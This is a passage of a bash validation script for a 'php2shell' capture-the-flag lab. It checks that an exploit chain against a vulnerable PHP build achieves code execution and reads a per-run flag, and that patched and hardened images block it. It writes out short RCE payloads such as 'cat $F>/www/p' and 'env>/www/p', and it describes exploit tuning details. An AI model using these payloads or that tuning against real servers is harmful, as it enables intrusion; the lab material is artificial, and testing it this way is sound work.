proof_http_code() {
  vm_ssh "curl -s --max-time 10 -o /dev/null -w '%{http_code}' http://127.0.0.1:$FWD_PORT/p"
}

assert_chain_green() { # <image> <label>; 0 only on a real, fetched proof
  local image=$1 label=$2 out rc body
  prime_target "$label chain"
  out=$(run_chain "$image")
  rc=$?
  say "$out"
  [ "$rc" -eq 0 ] || {
    say "  ($label: chain did not complete)"
    return 1
  }
  printf '%s' "$out" | grep -q '^PROOF:' || {
    say "  ($label: chain printed no PROOF line)"
    return 1
  }
  body=$(proof_body) || {
    say "  ($label: could not fetch /p)"
    return 1
  }
  proof_is_web_uid "$body" || {
    say "  ($label: proof is not the web worker uid: $body)"
    return 1
  }
  say "PASS: $label executes id as $(printf '%s' "$body" | head -1)"
  return 0
}

# Failure diagnostics for the flag objective (fail path only): capture the
# guest ground truth through the same proof channel, within the 14-byte
# carrier budget. The first re-runs the exact failing payload (one more
# probabilistic attempt: if it proves, the earlier failure was chance);
# the second shows the objective pointer in the executing worker. Each
# diagnostic is a full chain run, so they only fire when the flag read
# has already failed; their output is printed into the transcript so
# RESULTS.md can record the measured reason, not a guess.
flag_diag() { # flag_diag <image> <label> <cmd>
  local image=$1 label=$2 dcmd=$3 out rc body
  prime_target "$label diagnostic"
  out=$(run_chain "$image" 12 "$dcmd")
  rc=$?
  body=
  if [ "$rc" -eq 0 ]; then
    body=$(proof_body 2>/dev/null) || body=
  fi
  say "DIAG '$dcmd' rc=$rc body='$(printf '%s' "$body" | tr '\n' ' ' | head -c 300)'"
}

flag_read_diagnostics() { # flag_read_diagnostics <image> <label>
  local image=$1 label=$2
  flag_diag "$image" "$label" 'cat $F>/www/p'
  flag_diag "$image" "$label" 'echo $F>/www/p'
}

# The challenge objective, end to end: the per-run MMDS flag is published to
# /run/flag.txt (tmpfs, outside DocumentRoot; see assert_flag_http_absent),
# and the RCE -- which executes as www-data -- must be able to read it. The
# proof rides the established mechanism with a payload that fits the
# calibrated carrier's 14-byte command budget (the 167-byte fake HashTable
# caps --cmd at 14 bytes; the literal 24-byte `cat /run/flag.txt>/www/p` is
# rejected by the exploit itself, measured in run 20261119-190956):
# app-start exports F=/run/flag.txt, so the payload is `cat $F>/www/p`
# (13 bytes), fetched over HTTP from /p and exact-matched against the flag
# this runner handed to the instance through the agent API (MMDS).
assert_chain_flag_read() { # <image> <label>; 0 only on the exact flag match
  local image=$1 label=$2 out rc body
  prime_target "$label flag-read chain"
  out=$(run_chain "$image" 12 'cat $F>/www/p')
  rc=$?
  say "$out"
  if [ "$rc" -ne 0 ]; then
    flag_read_diagnostics "$image" "$label"
    say "  ($label: flag-read chain did not complete)"
    return 1
  fi
  if ! printf '%s' "$out" | grep -q '^PROOF:'; then
    flag_read_diagnostics "$image" "$label"
    say "  ($label: flag-read chain printed no PROOF line)"
    return 1
  fi
  body=$(proof_body) || {
    say "  ($label: could not fetch /p)"
    return 1
  }
  # `cat` of the byte-exact flag file; tolerate only line endings.
  body=$(printf '%s' "$body" | tr -d '\r\n')
  if [ "$body" != "$FLAG" ]; then
    flag_read_diagnostics "$image" "$label"
    say "  ($label: /p did not contain the per-run flag: $body)"
    return 1
  fi
  say "PASS: $label reads the per-run flag from /run/flag.txt through the RCE"
  return 0
}

# The objective pointer must be discoverable through the RCE as well: the
# recon payload `env>/www/p` (9 bytes -- the same length as the calibrated
# `id>/www/p`) dumps the worker environment, which must reveal F pointing
# at the flag file. This proves the documented player path (dump env, read
# $F) instead of assuming it. The dump must NOT contain the flag itself.
assert_chain_env_reveal() { # <image> <label>
  local image=$1 label=$2 out rc body
  prime_target "$label env-reveal chain"
  out=$(run_chain "$image" 12 'env>/www/p')
  rc=$?
  say "$out"
  [ "$rc" -eq 0 ] || {
    say "  ($label: env-reveal chain did not complete)"
    return 1
  }
  printf '%s' "$out" | grep -q '^PROOF:' || {
    say "  ($label: env-reveal chain printed no PROOF line)"
    return 1
  }
  body=$(proof_body) || {
    say "  ($label: could not fetch /p)"
    return 1
  }
  printf '%s' "$body" | grep -q 'F=/run/flag.txt' || {
    say "  ($label: the worker env does not reveal F=/run/flag.txt)"
    return 1
  }
  case "$body" in
    *"$FLAG"*) fail "$label: the env dump contains the flag itself" ;;
  esac
  say "PASS: $label reveals the objective pointer F=/run/flag.txt through the RCE"
  return 0
}

# Recon placement separation, positively verified: on a recon-named
# instance the chain still fires (www-data, full RCE), but $F resolves to
# the documented non-flag sentinel -- the exact-match proves both that the
# RCE works and that the flag is NOT on the RCE path. Requiring a
# non-empty, exact-match proof rules out a probabilistic stage-3 miss
# masquerading as a negative.
assert_chain_recon_intake() { # <image> <label>; 0 only on the exact sentinel match
  local image=$1 label=$2 out rc body
  prime_target "$label recon-intake chain"
  out=$(run_chain "$image" 12 'cat $F>/www/p')
  rc=$?
  say "$out"
  if [ "$rc" -ne 0 ]; then
    flag_read_diagnostics "$image" "$label"
    say "  ($label: recon-intake chain did not complete)"
    return 1
  fi
  if ! printf '%s' "$out" | grep -q '^PROOF:'; then
    flag_read_diagnostics "$image" "$label"
    say "  ($label: recon-intake chain printed no PROOF line)"
    return 1
  fi
  body=$(proof_body) || {
    say "  ($label: could not fetch /p)"
    return 1
  }
  body=$(printf '%s' "$body" | tr -d '\r\n')
  if [ "$body" != "$RECON_INTAKE_NOTE" ]; then
    flag_read_diagnostics "$image" "$label"
    say "  ($label: the RCE path did not yield the documented intake note: $body)"
    return 1
  fi
  say "PASS: $label: the RCE finds the non-flag intake note at \$F, not the flag"
  return 0
}

assert_chain_negative() { # <image> <label> [huge-mb]
  local image=$1 label=$2 huge=${3:-12} out rc code
  prime_target "$label chain negative"
  out=$(run_chain "$image" "$huge")
  rc=$?
  say "$out"
  [ "$rc" -ne 0 ] || fail "$label: chain unexpectedly succeeded"
  if printf '%s' "$out" | grep -q '^PROOF:'; then
    fail "$label: chain printed a PROOF line"
  fi
  # Semantic negative only: the upstream exploit must report that the LEAK
  # ITSELF did not reproduce against the reachable target. A transport
  # error, timeout or crash after any stage log line is a TEST FAILURE,
  # never a negative (final-review finding).
  printf '%s' "$out" | grep -qE '^(HEAP_LEAK_FAILED|LIBPHP_LEAK_FAILED)' ||
    fail "$label: no leak-absent verdict in the chain output; refusing to treat a transport/setup/crash outcome as a negative"
  # Proof absence must be an HTTP-level answer from the reachable target:
  # the forwarded webroot answers 404 for /p. 000 (tunnel failure), a
  # timeout, or any other code is a failure, not proof of absence.
  code=$(proof_http_code) || fail "$label: could not probe /p over the forward"
  [ "$code" -eq 404 ] ||
    fail "$label: /p answered HTTP $code (expected 404: a genuinely absent proof on a reachable target)"
  say "PASS: $label: leak absent (chain verdict) and /p answers 404 from the reachable target"
}

# ---------------------------------------------------------------------------
# 5. Vulnerable image: leaks must reproduce; the RCE runs only with a profile
# ---------------------------------------------------------------------------
say "==> creating the vulnerable instance"
VID=$(start_instance php2shell-vuln v) || fail "vulnerable instance failed"
say "vulnerable instance: $VID"
GIP=$(guest_ip "$VID")
[ -n "$GIP" ] || fail "no guest IP for $VID"
say "guest endpoint: $GIP:8080 (forwarded on 127.0.0.1:$FWD_PORT inside the VM)"
start_tunnel "$GIP"
stage_toolkit

assert_target "$PHP_VULN" 8M "vulnerable image"
assert_theme "vulnerable image"
# The flag must never be web-served: the old placement (/www/flag.txt) made
# GET /flag.txt hand the objective over plain HTTP. Both static-404 probes
# run BEFORE the leak assertions; they serve no PHP and disturb nothing.
assert_flag_http_absent "vulnerable image" flag.txt
assert_flag_http_absent "vulnerable image" www/flag.txt
# Credit placement: the flag lives ONLY at /run/flag.txt; the incident
# note must stay the shipped non-flag page.
assert_incident_note_clean "vulnerable image"

say "==> asserting the CVE memory-safety primitives (stages 1-2)"
assert_leaks_present php2shell-vuln "vulnerable PHP $PHP_VULN"

if [ "$RCE_ENABLED" = 1 ]; then
  say "==> running the calibrated RCE chain (stage 3 htdata=$STAGE3_HTDATA)"
  GREEN=0
  for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
    say "chain attempt $attempt/$P2S_CHAIN_RETRIES"
    if assert_chain_green php2shell-vuln "vulnerable PHP $PHP_VULN"; then GREEN=1; break; fi
  done
  [ "$GREEN" = 1 ] || fail "the calibrated chain did not produce the web-uid proof"
  say "==> proving the challenge objective: the RCE must read the per-run flag"
  ENVGREEN=0
  for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
    say "env-reveal chain attempt $attempt/$P2S_CHAIN_RETRIES"
    if assert_chain_env_reveal php2shell-vuln "vulnerable PHP $PHP_VULN"; then ENVGREEN=1; break; fi
  done
  [ "$ENVGREEN" = 1 ] ||
    fail "the chain did not reveal the objective pointer F through the RCE"
  FLAGGREEN=0
  for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
    say "flag-read chain attempt $attempt/$P2S_CHAIN_RETRIES"
    if assert_chain_flag_read php2shell-vuln "vulnerable PHP $PHP_VULN"; then FLAGGREEN=1; break; fi
  done
  [ "$FLAGGREEN" = 1 ] ||
    fail "the chain could not read the per-run flag from /run/flag.txt"
else
  say "==> stage 3 is NOT CALIBRATED: the RCE is not run and not asserted"
  [ "${P2S_REQUIRE_RCE:-0}" = 1 ] &&
    fail "P2S_REQUIRE_RCE=1 but no calibrated stage-3 geometry is available"
fi
api_code DELETE "/v1/instances/$VID" >/dev/null 2>&1 || true
vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
TUNNEL_PID=

# ---------------------------------------------------------------------------
# 5b. Platform-name delivery: the event registers the flag provider as
#     "flags/static"; rCTF passes that name through verbatim and the guest
#     init sanitises it to "flags_static" -- NOT the lab runner's "main".
#     /app/start resolves any delivery name (main, flags_static, or the
#     single flags file). Prove the platform path end to end: a second
#     vulnerable instance created exactly the way the platform would
#     create it, asserting the same themed app, the same not-web-served
#     negative, and the same RCE flag-read objective.
# ---------------------------------------------------------------------------
if [ "$RCE_ENABLED" = 1 ]; then
  say "==> creating the platform-named flag instance (provider flags/static)"
  FID=$(start_instance php2shell-vuln f flags/static) ||
    fail "platform-named instance failed"
  say "platform-named instance: $FID"
  GIP=$(guest_ip "$FID")
  [ -n "$GIP" ] || fail "no guest IP for $FID"
  say "guest endpoint: $GIP:8080 (forwarded on 127.0.0.1:$FWD_PORT inside the VM)"
  start_tunnel "$GIP"
  assert_target "$PHP_VULN" 8M "platform-named image"
  assert_theme "platform-named image"
  assert_flag_http_absent "platform-named image" flag.txt
  assert_flag_http_absent "platform-named image" www/flag.txt
  assert_incident_note_clean "platform-named image"
  say "==> platform path: the RCE objective must read the flags_static-delivered flag"
  PLATGREEN=0
  for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
    say "platform flag-read chain attempt $attempt/$P2S_CHAIN_RETRIES"
    if assert_chain_flag_read php2shell-vuln "platform-named image"; then PLATGREEN=1; break; fi
  done
  [ "$PLATGREEN" = 1 ] ||
    fail "the platform-named instance did not read its flag from /run/flag.txt"
  api_code DELETE "/v1/instances/$FID" >/dev/null 2>&1 || true
  vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
  TUNNEL_PID=
else
  say "==> stage 3 not calibrated: the platform-name delivery check is skipped"
fi

# ---------------------------------------------------------------------------
# 5c. Recon-stage placement (fc-m364-recon): the second staged record
#     publishes the delivered flag ONLY into the unlinked static incident
#     note (/incidents/EX2611-0442.html), leaves /run/flag.txt unwritten
#     and puts the documented non-flag sentinel on the RCE path ($F).
#     Both flag-delivery provider names are exercised.
# ---------------------------------------------------------------------------
if [ "$RCE_ENABLED" = 1 ]; then
  for rspec in "main r" "flags/static w"; do
    read -r rprovider rsuffix <<<"$rspec"
    say "==> creating the recon-named instance (provider $rprovider, env fc-m364-recon)"
    RID=$(start_instance php2shell-vuln "$rsuffix" "$rprovider" fc-m364-recon) ||
      fail "recon-named instance ($rprovider) failed"
    say "recon-named instance: $RID"
    GIP=$(guest_ip "$RID")
    [ -n "$GIP" ] || fail "no guest IP for $RID"
    start_tunnel "$GIP"
    assert_target "$PHP_VULN" 8M "recon image ($rprovider)"
    assert_theme "recon image ($rprovider)"
    assert_flag_http_absent "recon image ($rprovider)" flag.txt
    assert_flag_http_absent "recon image ($rprovider)" www/flag.txt
    assert_incident_flag "recon image ($rprovider)"
    say "==> recon path: the RCE must find the non-flag intake note, not the flag"
    RECONGREEN=0
    for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
      say "recon intake chain attempt $attempt/$P2S_CHAIN_RETRIES"
      if assert_chain_recon_intake php2shell-vuln "recon image ($rprovider)"; then
        RECONGREEN=1
        break
      fi
    done
    [ "$RECONGREEN" = 1 ] ||
      fail "the recon-named instance ($rprovider) did not verify its non-flag RCE path"
    api_code DELETE "/v1/instances/$RID" >/dev/null 2>&1 || true
    vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
    TUNNEL_PID=
  done
else
  say "==> stage 3 not calibrated: the recon placement checks are skipped"
fi

# ---------------------------------------------------------------------------
# 6. Negative control A: fixed PHP 8.4.27
# ---------------------------------------------------------------------------
say "==> control A: patched PHP $PHP_FIXED"
PID=$(start_instance php2shell-patched p) || fail "patched instance failed"
GIP=$(guest_ip "$PID")
start_tunnel "$GIP"
assert_target "$PHP_FIXED" 8M "patched image"
assert_theme "patched image"
say "==> control A: the leak primitives must be absent"
assert_leaks_absent php2shell-patched "patched PHP $PHP_FIXED"
assert_chain_negative php2shell-patched "patched PHP $PHP_FIXED"
api_code DELETE "/v1/instances/$PID" >/dev/null 2>&1 || true
vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
TUNNEL_PID=

# ---------------------------------------------------------------------------
# 7. Negative control B: hardened php.ini (memory_limit=128M)
# ---------------------------------------------------------------------------
say "==> control B: hardened php.ini (memory_limit=128M, shipped OOM body 12M)"
HID=$(start_instance php2shell-hardened h) || fail "hardened instance failed"
GIP=$(guest_ip "$HID")
start_tunnel "$GIP"
assert_target "$PHP_VULN" 128M "hardened image"
assert_theme "hardened image"
say "==> control B: at its configured limit the 12M OOM field cannot fire,"
say "    so the stale-id leak must be absent and the chain must fail closed"
assert_leaks_absent php2shell-hardened "hardened php.ini"
assert_chain_negative php2shell-hardened "hardened php.ini"

# Informational only (never a pass/fail): the toolkit documents that the same
# 8.4.26 build is exploitable at 128M when the OOM body is raised to 140M. If
# enabled, run that variant and record exactly what happens, so RESULTS.md can
# state whether this control is a configuration control or a mitigation.
if [ "${P2S_HARDENED_LIMIT_PROBE:-0}" = 1 ]; then
  say "==> control B informational probe: same image, huge_mb=140 (limit + 12M)"
  prime_target "hardened informational probe"
  probe_out=$(run_chain php2shell-hardened 140)
  probe_rc=$?
  say "$probe_out"
  probe_body=
  if [ "$probe_rc" -eq 0 ] && printf '%s' "$probe_out" | grep -q '^PROOF:'; then
    probe_body=$(proof_body 2>/dev/null) || probe_body=
  fi
  if proof_is_web_uid "$probe_body"; then
    say "OBSERVED: the hardened image DOES execute at huge_mb=140;"
    say "          control B is a configuration control, not a mitigation."
  else
    say "OBSERVED: the hardened image did not produce a proof even at huge_mb=140."
  fi
fi
api_code DELETE "/v1/instances/$HID" >/dev/null 2>&1 || true

say ""
if [ "$RCE_ENABLED" = 1 ]; then
  say "ALL PHP2SHELL LAB CHECKS PASSED (leaks + calibrated RCE + controls)"
  say "  RCE: VERIFIED with the profile's stage-3 geometry"
else
  say "PHP2SHELL LAB CHECKS PASSED (leak primitives + controls)"
  say "  RCE: NOT ASSERTED (no calibrated stage-3 geometry)"
fi
